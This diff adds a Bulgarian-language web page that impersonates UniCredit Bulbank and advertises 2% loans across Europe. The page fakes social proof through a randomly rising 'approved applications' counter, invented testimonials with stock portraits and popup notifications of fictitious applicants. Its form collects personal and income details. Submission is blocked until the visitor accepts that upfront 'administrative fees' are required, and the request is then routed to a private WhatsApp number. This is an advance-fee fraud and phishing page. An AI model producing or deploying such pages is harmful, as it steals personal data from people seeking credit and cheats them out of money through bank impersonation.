@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="bg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UniCredit - Европейско финансиране 2%</title>
+    
+    <style>
+        :root {
+            /* Цветове UniCredit */
+            --bank-red: #ec1c24; 
+            --bank-dark: #2d2d2d;
+            --bank-grey: #f4f4f4;
+            --white: #ffffff;
+            --bank-blue: #003366;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 0; color: #333; background-color: var(--bank-grey); overflow-x: hidden;
+        }
+
+        /* БАНЕР С БРОЯЧ */
+        .growth-ticker {
+            background: var(--bank-dark); color: white; padding: 12px; text-align: center; font-size: 14px; font-weight: bold; border-bottom: 3px solid var(--bank-red);
+        }
+        #dossier-count { color: var(--bank-red); font-size: 18px; }
+
+        header {
+            background: var(--white); padding: 15px 5%; display: flex; justify-content: space-between; align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000;
+        }
+        .logo { font-size: 26px; font-weight: bold; color: var(--bank-red); text-decoration: none; display: flex; align-items: center; }
+        .logo span { background: var(--bank-red); color: white; padding: 2px 8px; border-radius: 4px; margin-left: 5px; font-size: 18px; }
+
+        .hero {
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.unsplash.com/photo-1560520653-9e0e4c89eb11?auto=format&fit=crop&w=1350&q=80');
+            background-size: cover; background-position: center; color: white; padding: 60px 5%; text-align: center;
+            border-bottom: 5px solid var(--bank-red);
+        }
+
+        /* РЕШЕТКА С ОФЕРТИ */
+        .offers-container { padding: 40px 5%; display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
+        .offer-card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.08); transition: 0.3s; text-align: center; display: flex; flex-direction: column; border-top: 3px solid transparent; }
+        .offer-card:hover { transform: translateY(-10px); border-top: 3px solid var(--bank-red); }
+        .offer-card img { width: 100%; height: 160px; object-fit: cover; }
+        .offer-content { padding: 20px; flex-grow: 1; }
+        .offer-content h3 { color: var(--bank-dark); margin-bottom: 10px; }
+        .offer-content p { font-size: 13px; color: #666; margin-bottom: 20px; line-height: 1.5; min-height: 60px; }
+        .btn-open { background: var(--bank-red); color: white; padding: 12px; border: none; width: 100%; font-weight: bold; border-radius: 5px; cursor: pointer; transition: 0.3s; }
+        .btn-open:hover { background: #c11219; }
+
+        /* МОДАЛЕН ПРОЗОРЕЦ */
+        .modal { display: none; position: fixed; z-index: 5000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); overflow-y: auto; padding: 20px 0; }
+        .modal-content { background: white; margin: auto; padding: 30px; width: 95%; max-width: 550px; border-radius: 15px; position: relative; border-top: 8px solid var(--bank-red); }
+        .close { float: right; font-size: 28px; cursor: pointer; color: #888; }
+        
+        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px; }
+        .form-group label { display: block; font-size: 11px; font-weight: bold; color: var(--bank-dark); margin-bottom: 4px; }
+        .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        .full { grid-column: span 2; }
+
+        .check-box { background: #fff5f5; border: 1px solid #ffcccc; padding: 15px; border-radius: 8px; margin: 20px 0; display: flex; gap: 12px; align-items: flex-start; }
+        .check-box input { width: 24px; height: 24px; cursor: pointer; flex-shrink: 0; }
+        .check-box label { font-size: 12px; color: #555; font-weight: bold; line-height: 1.4; }
+
+        .btn-wa { background: #25D366; color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-weight: bold; cursor: not-allowed; opacity: 0.4; text-transform: uppercase; }
+        .btn-wa.active { cursor: pointer; opacity: 1; box-shadow: 0 5px 20px rgba(37, 211, 102, 0.4); }
+
+        /* ОТЗИВИ */
+        .testimonial-container { background: #fff; overflow: hidden; padding: 60px 0 30px; position: relative; }
+        .testimonial-track { display: flex; width: max-content; gap: 20px; animation: scroll-slow 60s linear infinite; }
+        @keyframes scroll-slow { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+        .testimonial-card { min-width: 300px; max-width: 300px; background: var(--bank-grey); padding: 40px 20px 20px; border-radius: 15px; border-bottom: 4px solid var(--bank-red); position: relative; white-space: normal; }
+        .client-photo { width: 70px; height: 70px; border-radius: 50%; border: 3px solid var(--bank-red); position: absolute; top: -35px; left: 20px; object-fit: cover; background: white; }
+        .client-name { color: var(--bank-red); font-size: 15px; font-weight: 800; text-transform: uppercase; display: block; }
+        .client-country { color: var(--bank-dark); font-size: 11px; font-weight: bold; margin-bottom: 10px; display: block; opacity: 0.7; }
+
+        /* ИЗВЕСТИЯ */
+        #notif-container { position: fixed; bottom: 20px; left: 20px; z-index: 6000; }
+        .notif-bubble { background: white; padding: 12px 20px; border-radius: 50px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 12px; margin-top: 10px; border-left: 5px solid var(--bank-red); transform: translateX(-150%); transition: 0.5s ease; width: 320px; }
+        .notif-bubble.show { transform: translateX(0); }
+        .notif-bubble img { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; }
+
+        footer { background: var(--bank-dark); color: white; text-align: center; padding: 50px 5%; font-size: 13px; }
+        .footer-addr { margin-top: 20px; padding-top: 20px; border-top: 1px solid #444; color: #aaa; line-height: 1.6; }
+    </style>
+</head>
+<body>
+
+    <div class="growth-ticker">
+        🇪🇺 ЕВРОПЕЙСКА МРЕЖА: <span id="dossier-count">24512</span> ОДОБРЕНИ ЗАЯВЛЕНИЯ ТОЗИ МЕСЕЦ
+    </div>
+
+    <header>
+        <a href="#" class="logo">UniCredit<span>Bulbank</span></a>
+    </header>
+
+    <section class="hero">
+        <h1 style="font-size: 32px;">Европейско финансиране при 2% лихва</h1>
+        <p>Подкрепа в цяла Европа. Вашият проект е наш приоритет.</p>
+    </section>
+
+    <section class="offers-container">
+        <div class="offer-card"><img src="https://images.unsplash.com/photo-1560518883-ce09059eeffa?w=400"><div class="offer-content"><h3>Ипотечен кредит</h3><p>Финансирайте закупуването на вашето основно или второ жилище навсякъде в Европа.</p><button class="btn-open" onclick="openModal('Ипотечен')">Кандидатствай</button></div></div>
+        <div class="offer-card"><img src="https://images.unsplash.com/photo-1523348837708-15d4a09cfac2?w=400"><div class="offer-content"><h3>Земеделски кредит</h3><p>Предназначен за европейски ферми за закупуване на модерна техника и оборудване.</p><button class="btn-open" onclick="openModal('Земеделски')">Кандидатствай</button></div></div>
+        <div class="offer-card"><img src="https://images.unsplash.com/photo-1533473359331-0135ef1b58bf?w=400"><div class="offer-content"><h3>Автокредит</h3><p>Купете нов или употребяван автомобил с вноски, адаптирани към вашите възможности.</p><button class="btn-open" onclick="openModal('Автокредит')">Кандидатствай</button></div></div>
+        <div class="offer-card"><img src="https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=400"><div class="offer-content"><h3>Кредит за пътуване</h3><p>Реализирайте вашите ваканционни планове или спешни международни пътувания.</p><button class="btn-open" onclick="openModal('Пътуване')">Кандидатствай</button></div></div>
+        <div class="offer-card"><img src="https://images.unsplash.com/photo-1523240795612-9a054b0db644?w=400"><div class="offer-content"><h3>Студентски кредит</h3><p>Осигурете бъдещето си чрез финансиране на университетски такси и разходи.</p><button class="btn-open" onclick="openModal('Образование')">Кандидатствай</button></div></div>
+        <div class="offer-card"><img src="https://images.unsplash.com/photo-1517646287270-a5a9ca602e5c?w=400"><div class="offer-content"><h3>Личен кредит</h3><p>Средства за ремонти, сватби или всякакви важни лични събития.</p><button class="btn-open" onclick="openModal('Личен')">Кандидатствай</button></div></div>
+    </section>
+
+    <section class="testimonial-container">
+        <h2 style="text-align:center; color:var(--bank-dark); margin-bottom: 50px;">Удовлетвореност на нашите европейски клиенти</h2>
+        <div class="testimonial-track" id="track"></div>
+    </section>
+
+    <div id="loanModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <h2 id="modalTitle" style="color:var(--bank-red); margin:0;"></h2>
+            <div class="form-grid">
+                <div class="form-group"><label>Фамилия</label><input type="text" id="f-nom"></div>
+                <div class="form-group"><label>Име</label><input type="text" id="f-prenom"></div>
+                <div class="form-group"><label>Град</label><input type="text" id="f-ville"></div>
+                <div class="form-group"><label>Държава</label><input type="text" id="f-pays"></div>
+                <div class="form-group full"><label>Адрес</label><input type="text" id="f-adresse"></div>
+                <div class="form-group"><label>Имейл</label><input type="email" id="f-email"></div>
+                <div class="form-group"><label>Телефон</label><input type="tel" id="f-tel"></div>
+                <div class="form-group"><label>Сума (€)</label><input type="number" id="f-amt"></div>
+                <div class="form-group"><label>Срок (Месеци)</label><input type="number" id="f-duree"></div>
+                <div class="form-group full"><label>Месечен доход (€)</label><input type="number" id="f-revue"></div>
+            </div>
+            <div class="check-box">
+                <input type="checkbox" id="check-frais" onchange="toggleBtn()">
+                <label for="check-frais">Потвърждавам, че заплащането на административните такси е необходимо условие за бързото активиране на моя кредит до 48 часа. ⚠️</label>
+            </div>
+            <button class="btn-wa" id="submitBtn" onclick="sendWA()">ЗАВЪРШИ В WHATSAPP</button>
+        </div>
+    </div>
+
+    <div id="notif-container"></div>
+
+    <footer>
+        <p><b>UNICREDIT INTERNATIONAL</b> - © 2026.</p>
+        <div class="footer-addr">пл. „Света Неделя“ 7, 1000 София, България | Лиценз от БНБ № 16488</div>
+    </footer>
+
+    <script>
+        let count = 24512;
+        setInterval(() => { count += Math.floor(Math.random() * 2) + 1; document.getElementById('dossier-count').innerText = count.toLocaleString(); }, 6000);
+
+        const EURO_CLIENTS = [
+            {n:"Димитър Иванов", v:"София, БЪЛГАРИЯ", p:"https://randomuser.me/api/portraits/men/11.jpg", t:"Ипотечен кредит получен без проблеми."},
+            {n:"Йохан Петерс", v:"Антверпен, БЕЛГИЯ", p:"https://randomuser.me/api/portraits/men/32.jpg", t:"Отлично обслужване! Ненадмината лихва."},
+            {n:"Елена Роси", v:"Милано, ИТАЛИЯ", p:"https://randomuser.me/api/portraits/women/44.jpg", t:"Много професионално. Изпълняват обещаното."},
+            {n:"Лукас Вебер", v:"Берлин, ГЕРМАНИЯ", p:"https://randomuser.me/api/portraits/men/55.jpg", t:"Бърза обработка. Кредитът бе одобрен за 48 часа."},
+            {n:"Мария Николова", v:"Пловдив, БЪЛГАРИЯ", p:"https://randomuser.me/api/portraits/women/65.jpg", t:"Обслужването през WhatsApp е на първо ниво."},
+            {n:"Карлос Гомес", v:"Мадрид, ИСПАНИЯ", p:"https://randomuser.me/api/portraits/men/66.jpg", t:"Страхотно обслужване. Благодаря на UniCredit."},
+            {n:"Марк Тил", v:"ЛЮКСЕМБУРГ", p:"https://randomuser.me/api/portraits/men/77.jpg", t:"Успешна консолидация на дългове при 2%."}
+        ];
+
+        const track = document.getElementById('track');
+        const fullList = [...EURO_CLIENTS, ...EURO_CLIENTS]; 
+        fullList.forEach(c => {
+            const d = document.createElement('div');
+            d.className = 'testimonial-card';
+            d.innerHTML = `<img src="${c.p}" class="client-photo"><span class="client-name">${c.n}</span><span class="client-country">📍 ${c.v}</span><p style="font-size:12px; font-style:italic; margin:10px 0;">"${c.t}"</p><span style="color:var(--bank-red)">★★★★★</span>`;
+            track.appendChild(d);
+        });
+
+        function createNotif() {
+            const users = [
+                {n:"Иван", v:"Варна"}, {n:"Петър", v:"Бургас"}, {n:"Елена", v:"София"}
+            ];
+            const user = users[Math.floor(Math.random()*users.length)];
+            const container = document.getElementById('notif-container');
+            const bubble = document.createElement('div');
+            bubble.className = 'notif-bubble';
+            bubble.innerHTML = `<img src="https://randomuser.me/api/portraits/men/${Math.floor(Math.random()*50)}.jpg"><span><b>${user.n}</b> (${user.v}) завършва своята заявка...</span>`;
+            container.appendChild(bubble);
+            setTimeout(() => bubble.classList.add('show'), 100);
+            setTimeout(() => { bubble.classList.remove('show'); setTimeout(()=>bubble.remove(), 600); }, 4500);
+        }
+        setInterval(createNotif, 8500);
+
+        let activeType = "";
+        function openModal(t) { activeType = t; document.getElementById('modalTitle').innerText = "Кредит: " + t; document.getElementById('loanModal').style.display = "block"; }
+        function closeModal() { document.getElementById('loanModal').style.display = "none"; }
+        function toggleBtn() { document.getElementById('submitBtn').classList.toggle('active', document.getElementById('check-frais').checked); }
+        
+        function sendWA() {
+            if(!document.getElementById('check-frais').checked) return;
+            const nom = document.getElementById('f-nom').value;
+            const monto = document.getElementById('f-amt').value;
+            const msg = `*ЗАЯВКА ЗА КРЕДИТ UNICREDIT*\nТип: ${activeType}\nКлиент: ${nom}\nСума: ${monto}€\nБележка: Клиентът приема условията за таксите.`;
+            window.open(`https://wa.me/359877880602?text=${encodeURIComponent(msg)}`, '_blank');
+        }
+    </script>
+</body>
+                                                        </html>
+                                                        
